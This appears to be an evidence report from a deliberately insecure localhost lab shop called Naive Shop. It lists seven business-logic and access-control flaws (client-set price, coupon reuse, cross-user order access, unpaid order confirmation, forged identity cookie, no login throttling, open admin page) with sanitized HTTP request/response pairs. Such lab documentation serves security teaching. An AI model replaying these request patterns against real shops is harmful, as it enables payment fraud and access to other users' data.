# Naive Shop all attack evidence

- Timestamp: 2026-11-22T07:15:25.227469+00:00
- Target: `http://127.0.0.1:8010`; local-only server and disposable in-memory data.
- Passwords, cookie values, and token/secret fields are redacted.
- PASS means the expected vulnerable behavior and impact were observed, not merely an HTTP 200.
- V2 proves repeated discount calculation acceptance, not completed discounted purchases.
- V6 verifies eight invalid attempts followed by a successful correct login; it does not characterize other throttling layers.

| ID | Scenario | Result | Observed impact |
|---|---|---|---|
| V1 | Client-controlled checkout price | PASS | Persisted order total was $1.00. |
| V2 | Coupon reuse | PASS | Repeated requests each returned a 20% discount. |
| V3 | Cross-user order access | PASS | Bob retrieved Alice's order #1. |
| V4 | Unpaid workflow confirmation | PASS | Order #1 changed from unpaid to paid without payment. |
| V5 | Client-controlled identity cookie | PASS | Checkout accepted and persisted a forged cookie identity. |
| V6 | Missing login throttling | PASS | Eight invalid attempts were followed by a successful valid login. |
| V7 | Unauthenticated admin access | PASS | Anonymous response exposed seeded users, roles, and simulated credit. |

## Sanitized HTTP exchanges

### Exchange 1: GET /reset

```http
GET /reset HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:24 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 37
X-Content-Type-Options: nosniff

{"ok": true, "message": "data reset"}
```

### Exchange 2: POST /api/login

```http
POST /api/login HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json

{"password": "[REDACTED]", "username": "alice"}
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:24 GMT
Content-Type: application/json
Content-Length: 12
X-Content-Type-Options: nosniff
Set-Cookie: [REDACTED]

{"ok": true}
```

### Exchange 3: POST /api/checkout

```http
POST /api/checkout HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json
Cookie: [REDACTED; test identity: Alice, disposable seeded account]

{"price": 1, "product_id": 1}
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:24 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 31
X-Content-Type-Options: nosniff

{"order_id": 1, "charged": 1.0}
```

### Exchange 4: GET /api/orders/1

```http
GET /api/orders/1 HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json
Cookie: [REDACTED; test identity: Alice, disposable seeded account]
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:24 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 133
X-Content-Type-Options: nosniff

{"id": 1, "owner": "alice", "product_id": 1, "quantity": 1, "items": [{"product_id": 1, "quantity": 1}], "total": 1.0, "paid": false}
```

### Exchange 5: GET /reset

```http
GET /reset HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:24 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 37
X-Content-Type-Options: nosniff

{"ok": true, "message": "data reset"}
```

### Exchange 6: POST /api/apply_coupon

```http
POST /api/apply_coupon HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json

{"code": "SAVE20", "subtotal": 100}
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:24 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 46
X-Content-Type-Options: nosniff

{"discount_percent": 20, "new_subtotal": 80.0}
```

### Exchange 7: POST /api/apply_coupon

```http
POST /api/apply_coupon HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json

{"code": "SAVE20", "subtotal": 100}
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:24 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 46
X-Content-Type-Options: nosniff

{"discount_percent": 20, "new_subtotal": 80.0}
```

### Exchange 8: GET /reset

```http
GET /reset HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:24 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 37
X-Content-Type-Options: nosniff

{"ok": true, "message": "data reset"}
```

### Exchange 9: POST /api/login

```http
POST /api/login HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json

{"password": "[REDACTED]", "username": "alice"}
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:24 GMT
Content-Type: application/json
Content-Length: 12
X-Content-Type-Options: nosniff
Set-Cookie: [REDACTED]

{"ok": true}
```

### Exchange 10: POST /api/checkout

```http
POST /api/checkout HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json
Cookie: [REDACTED; test identity: Alice, disposable seeded account]

{"price": 1337, "product_id": 1}
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:24 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 34
X-Content-Type-Options: nosniff

{"order_id": 1, "charged": 1337.0}
```

### Exchange 11: GET /api/orders/1

```http
GET /api/orders/1 HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json
Cookie: [REDACTED; test identity: Bob, disposable seeded account]
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:24 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 136
X-Content-Type-Options: nosniff

{"id": 1, "owner": "alice", "product_id": 1, "quantity": 1, "items": [{"product_id": 1, "quantity": 1}], "total": 1337.0, "paid": false}
```

### Exchange 12: GET /reset

```http
GET /reset HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 37
X-Content-Type-Options: nosniff

{"ok": true, "message": "data reset"}
```

### Exchange 13: POST /api/login

```http
POST /api/login HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json

{"password": "[REDACTED]", "username": "alice"}
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: application/json
Content-Length: 12
X-Content-Type-Options: nosniff
Set-Cookie: [REDACTED]

{"ok": true}
```

### Exchange 14: POST /api/checkout

```http
POST /api/checkout HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json
Cookie: [REDACTED; test identity: Alice, disposable seeded account]

{"price": 1337, "product_id": 1}
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 34
X-Content-Type-Options: nosniff

{"order_id": 1, "charged": 1337.0}
```

### Exchange 15: GET /api/orders/1

```http
GET /api/orders/1 HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 136
X-Content-Type-Options: nosniff

{"id": 1, "owner": "alice", "product_id": 1, "quantity": 1, "items": [{"product_id": 1, "quantity": 1}], "total": 1337.0, "paid": false}
```

### Exchange 16: GET /api/confirm?order=1

```http
GET /api/confirm?order=1 HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json
Cookie: [REDACTED; test identity: Bob, disposable seeded account]
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 165
X-Content-Type-Options: nosniff

{"confirmed": true, "order": {"id": 1, "owner": "alice", "product_id": 1, "quantity": 1, "items": [{"product_id": 1, "quantity": 1}], "total": 1337.0, "paid": true}}
```

### Exchange 17: GET /api/orders/1

```http
GET /api/orders/1 HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 135
X-Content-Type-Options: nosniff

{"id": 1, "owner": "alice", "product_id": 1, "quantity": 1, "items": [{"product_id": 1, "quantity": 1}], "total": 1337.0, "paid": true}
```

### Exchange 18: GET /reset

```http
GET /reset HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 37
X-Content-Type-Options: nosniff

{"ok": true, "message": "data reset"}
```

### Exchange 19: POST /api/checkout

```http
POST /api/checkout HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json
Cookie: [REDACTED; test identity: forged disposable identity]

{"price": 1, "product_id": 1}
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 31
X-Content-Type-Options: nosniff

{"order_id": 1, "charged": 1.0}
```

### Exchange 20: GET /api/orders/1

```http
GET /api/orders/1 HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 148
X-Content-Type-Options: nosniff

{"id": 1, "owner": "forged-demo-identity", "product_id": 1, "quantity": 1, "items": [{"product_id": 1, "quantity": 1}], "total": 1.0, "paid": false}
```

### Exchange 21: GET /reset

```http
GET /reset HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 37
X-Content-Type-Options: nosniff

{"ok": true, "message": "data reset"}
```

### Exchange 22: POST /api/login

```http
POST /api/login HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json

{"password": "[REDACTED]", "username": "alice"}
```

```http
HTTP/1.0 401
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 28
X-Content-Type-Options: nosniff

{"error": "bad credentials"}
```

### Exchange 23: POST /api/login

```http
POST /api/login HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json

{"password": "[REDACTED]", "username": "alice"}
```

```http
HTTP/1.0 401
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 28
X-Content-Type-Options: nosniff

{"error": "bad credentials"}
```

### Exchange 24: POST /api/login

```http
POST /api/login HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json

{"password": "[REDACTED]", "username": "alice"}
```

```http
HTTP/1.0 401
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 28
X-Content-Type-Options: nosniff

{"error": "bad credentials"}
```

### Exchange 25: POST /api/login

```http
POST /api/login HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json

{"password": "[REDACTED]", "username": "alice"}
```

```http
HTTP/1.0 401
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 28
X-Content-Type-Options: nosniff

{"error": "bad credentials"}
```

### Exchange 26: POST /api/login

```http
POST /api/login HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json

{"password": "[REDACTED]", "username": "alice"}
```

```http
HTTP/1.0 401
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 28
X-Content-Type-Options: nosniff

{"error": "bad credentials"}
```

### Exchange 27: POST /api/login

```http
POST /api/login HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json

{"password": "[REDACTED]", "username": "alice"}
```

```http
HTTP/1.0 401
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 28
X-Content-Type-Options: nosniff

{"error": "bad credentials"}
```

### Exchange 28: POST /api/login

```http
POST /api/login HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json

{"password": "[REDACTED]", "username": "alice"}
```

```http
HTTP/1.0 401
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 28
X-Content-Type-Options: nosniff

{"error": "bad credentials"}
```

### Exchange 29: POST /api/login

```http
POST /api/login HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json

{"password": "[REDACTED]", "username": "alice"}
```

```http
HTTP/1.0 401
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 28
X-Content-Type-Options: nosniff

{"error": "bad credentials"}
```

### Exchange 30: POST /api/login

```http
POST /api/login HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json

{"password": "[REDACTED]", "username": "alice"}
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: application/json
Content-Length: 12
X-Content-Type-Options: nosniff
Set-Cookie: [REDACTED]

{"ok": true}
```

### Exchange 31: GET /reset

```http
GET /reset HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 37
X-Content-Type-Options: nosniff

{"ok": true, "message": "data reset"}
```

### Exchange 32: GET /admin

```http
GET /admin HTTP/1.1
Host: 127.0.0.1:8010
Content-Type: application/json
```

```http
HTTP/1.0 200
Server: BaseHTTP/0.6 Python/3.11.9
Date: Sun, 22 Nov 2026 07:15:25 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 8466
X-Content-Type-Options: nosniff

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="theme-color" content="#10172a">
<title>Admin | Naive Shop Lab</title>
<style>
:root{--ink:#172033;--muted:#667085;--paper:#f5f7fb;--card:#fff;--line:#e4e9f1;
--brand:#5b55e7;--brand-dark:#3933b5;--accent:#f0a94b;--danger:#a42d38;--green:#167653}
*{box-sizing:border-box}
body{margin:0;background:var(--paper);color:var(--ink);font:16px/1.5 system-ui,-apple-system,"Segoe UI",sans-serif}
a{color:inherit;text-decoration:none}
button,input{font:inherit}
.top-note{background:#351b22;color:#ffe4e4;text-align:center;padding:8px 14px;font-size:.84rem}
.top-note strong{letter-spacing:.08em}
.header{background:#10172a;color:#fff}
.nav{max-width:1180px;margin:auto;padding:17px 22px;display:flex;align-items:center;gap:26px}
.brand{font-weight:850;font-size:1.3rem;letter-spacing:-.04em;white-space:nowrap}
.brand span{color:#a7a4ff}
.navlinks{display:flex;align-items:center;gap:20px;margin-left:auto;color:#d4d8e6;font-size:.94rem}
.navlinks a:hover{color:#fff}
.navright{display:flex;align-items:center;gap:12px;white-space:nowrap}
.navright a{color:#fff}
.pill{border:1px solid #596078;border-radius:999px;padding:7px 12px;font-size:.86rem}
.container{width:min(1180px,100%);margin:0 auto;padding:28px 22px 60px}
.hero{display:grid;grid-template-columns:1.2fr .8fr;gap:30px;align-items:center;padding:36px 0 42px}
.eyebrow{font-size:.77rem;letter-spacing:.13em;text-transform:uppercase;color:var(--brand);font-weight:800}
h1{font-size:clamp(2rem,4vw,3.55rem);line-height:1.06;letter-spacing:-.055em;margin:10px 0 14px}
h2{font-size:1.75rem;line-height:1.15;letter-spacing:-.035em;margin:0 0 10px}
h3{margin:0 0 8px;line-height:1.25}
p{margin:0 0 14px}
.muted{color:var(--muted)}
.hero-card{min-height:250px;border-radius:24px;padding:28px;background:linear-gradient(145deg,#222947,#4b49a7);
color:#fff;display:flex;flex-direction:column;justify-content:space-between;box-shadow:0 18px 38px #24285a24}
.hero-card .tag{font-size:.82rem;color:#dadaff}
.hero-card .price{font-size:2.1rem;font-weight:800;letter-spacing:-.04em}
.hero-card .price small{font-size:.9rem;font-weight:500;opacity:.8}
.toolbar{display:flex;align-items:center;justify-content:space-between;gap:15px;margin:12px 0 20px}
.search{display:flex;gap:8px;max-width:500px;width:100%}
input,select{border:1px solid #d6dce7;border-radius:10px;padding:11px 12px;background:#fff;color:var(--ink);min-width:0}
input:focus,select:focus{outline:3px solid #5b55e733;border-color:var(--brand)}
.search input{flex:1}
.button{display:inline-flex;justify-content:center;align-items:center;gap:7px;border:0;border-radius:10px;
padding:11px 16px;background:var(--brand);color:#fff;font-weight:750;cursor:pointer}
.button:hover{background:var(--brand-dark)}
.button.secondary{background:#ecebff;color:#3731ae}
.button.ghost{background:#fff;color:var(--ink);border:1px solid var(--line)}
.button.danger{background:#fff0f0;color:var(--danger);border:1px solid #f1d0d2}
.button.small{padding:8px 10px;font-size:.88rem}
.grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:18px}
.card{background:var(--card);border:1px solid var(--line);border-radius:17px;overflow:hidden;
box-shadow:0 5px 16px #13213a08;display:flex;flex-direction:column}
.product-art{height:155px;display:grid;place-items:center;background:linear-gradient(135deg,#ebeaff,#d9e7fa);
color:#403bb0;font-size:3.1rem;font-weight:800;letter-spacing:-.08em}
.product-art.alt1{background:linear-gradient(135deg,#fff1dc,#f8d7b8);color:#994d21}
.product-art.alt2{background:linear-gradient(135deg,#e5f5ee,#c6e7d8);color:#226d54}
.product-art.alt3{background:linear-gradient(135deg,#f1e7fa,#decdf0);color:#7548a0}
.card-body{padding:16px;display:flex;flex-direction:column;flex:1}
.category{font-size:.75rem;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:750}
.product-name{font-size:1.1rem;margin:5px 0 6px}
.card-body .muted{font-size:.88rem;min-height:40px}
.card-foot{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-top:auto;padding-top:12px}
.price{font-weight:850;font-size:1.1rem}
.section-head{display:flex;align-items:end;justify-content:space-between;gap:12px;margin:34px 0 15px}
.panel{background:#fff;border:1px solid var(--line);border-radius:17px;padding:20px;box-shadow:0 5px 16px #13213a08}
.layout{display:grid;grid-template-columns:minmax(0,1.3fr) minmax(270px,.7fr);gap:20px;align-items:start}
.row{display:flex;align-items:center;gap:12px}
.spread{display:flex;align-items:center;justify-content:space-between;gap:12px}
.stack{display:grid;gap:12px}
.cart-row{display:grid;grid-template-columns:minmax(0,1fr) auto auto;gap:14px;align-items:center;
padding:14px 0;border-bottom:1px solid var(--line)}
.qty{width:92px}
.form-grid{display:grid;gap:13px}
.form-grid label{display:grid;gap:6px;font-size:.9rem;font-weight:700}
.notice{padding:12px 15px;border:1px solid #b5e3d2;background:#eaf8f1;color:#125b42;border-radius:11px;margin:12px 0 18px}
.warning{padding:12px 15px;border:1px solid #efc7a0;background:#fff4e8;color:#844514;border-radius:11px;margin:14px 0}
.table-wrap{overflow-x:auto;background:#fff;border:1px solid var(--line);border-radius:15px}
table{border-collapse:collapse;width:100%;min-width:560px}
th,td{text-align:left;padding:13px 15px;border-bottom:1px solid var(--line)}
th{background:#f8f9fc;color:#596274;font-size:.78rem;letter-spacing:.08em;text-transform:uppercase}
tr:last-child td{border-bottom:0}
.empty{text-align:center;padding:40px 18px}
.empty .icon{font-size:2.4rem;margin-bottom:8px}
.footer{background:#10172a;color:#b9c0d0;padding:24px 20px;text-align:center;font-size:.86rem}
.footer strong{color:#fff}
.demo-label{display:inline-flex;border:1px solid #f0c891;border-radius:999px;padding:4px 9px;
background:#fff7eb;color:#754816;font-size:.74rem;font-weight:800;letter-spacing:.04em}
.detail{display:grid;grid-template-columns:.9fr 1.1fr;gap:26px;align-items:start}
.detail .product-art{height:340px;border-radius:20px;font-size:5rem}
.notice-list{padding-left:20px;color:var(--muted)}
@media(max-width:850px){.grid{grid-template-columns:repeat(2,minmax(0,1fr))}.nav{gap:14px}
.navlinks{gap:12px}.hero{gap:18px}}
@media(max-width:640px){.nav{flex-wrap:wrap;padding:14px 16px;gap:12px}
.navlinks{order:3;overflow-x:auto;width:100%;margin:0;padding:4px 0 2px}
.navright{margin-left:auto}.container{padding:22px 16px 42px}
.hero{grid-template-columns:1fr;padding:20px 0 30px}.hero-card{min-height:200px}
.grid{grid-template-columns:1fr 1fr;gap:11px}.product-art{height:120px;font-size:2.5rem}
.card-body{padding:12px}.card-foot{align-items:flex-start;flex-direction:column}
.layout,.detail{grid-template-columns:1fr}.detail .product-art{height:240px}
.toolbar{align-items:stretch;flex-direction:column}.cart-row{grid-template-columns:1fr auto}
.cart-row .row-actions{grid-column:1/-1;justify-content:flex-end}
h1{font-size:2.4rem}}
@media(max-width:380px){.grid{grid-template-columns:1fr}.navright{gap:6px}.pill{padding:6px 9px}}
</style>
</head>
<body>
<div class="top-note"><strong>EDUCATIONAL LAB</strong> - Deliberately insecure. Localhost only. No real payments.</div>
<header class="header"><nav class="nav" aria-label="Main navigation">
<a class="brand" href="/">NAIVE<span>SHOP</span></a>
<div class="navlinks"><a href="/products">Shop</a><a href="/cart">Cart (0)</a>
<a href="/orders">Orders</a><a href="/profile">Account</a><a href="/admin">Admin</a></div>
<div class="navright"><a href="/login">Sign in</a></div>
</nav></header>
<main class="container">
<div class="section-head"><div><span class="eyebrow">Restricted area - intentionally open</span>
<h2>Admin overview</h2><p class="muted">This page is unauthenticated by design (V7).</p></div>
<span class="demo-label">NO ROLE CHECK</span></div>
<div class="table-wrap"><table><thead><tr><th>User</th><th>Role</th><th>Simulated credit</th></tr></thead><tbody><tr><td>alice</td><td>customer</td><td>$100.00</td></tr><tr><td>bob</td><td>customer</td><td>$100.00</td></tr><tr><td>admin</td><td>admin</td><td>$0.00</td></tr></tbody></table></div>
<div class="warning">Do not use real identities or data in this local education lab.</div></main>
<footer class="footer"><strong>Naive Shop Lab</strong> - CET431 local demonstration environment.
Intentionally vulnerable endpoints are labeled in the source.</footer>
</body></html>
```

